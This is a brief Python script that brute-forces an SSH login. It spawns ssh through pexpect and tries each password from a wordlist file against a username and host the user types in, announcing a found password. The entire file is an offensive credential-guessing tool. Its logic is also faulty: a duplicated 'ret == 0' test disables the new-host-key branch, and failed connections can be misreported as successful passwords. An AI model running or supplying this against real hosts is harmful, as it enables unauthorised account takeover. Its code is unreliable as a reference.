#!/usr/bin/python

import pexpect
from termcolor import colored
PROMPT = ['# ','>>> ','>','\$ ']


def connect(user,host,password):
        ssh_newkey = 'Are you sure you want to continue connecting'
        connStr = "ssh " + user + "@" + host
        child = pexpect.spawn(connStr)
        ret = child.expect([pexpect.TIMEOUT, ssh_newkey, '[P|p]assword: '])
        if ret == 0:
                print("[-] Error Connecting")
                return
        if ret == 0 :
                child.sendline('yes')
                ret = child.expect([pexpect.TIMEOUT, '[P|p]assword: '])
                if ret == 0:
                        print("[-] Error Connecting")
                        return
        child.sendline(password)
        child.expect(PROMPT,timeout = 0.5)
        return child

def main():
	host = input("Enter the Host IP address: ")
	user = input("Enter the username which you want to brute force:")
	file = open("password.txt","r")
	for password in file.readlines():
		password = password.strip('\n')
		try:
			child = connect(user,host,password)
			print(colored("[+] Password Found "+ password,'green'))
			break
		except:
			pass
main()
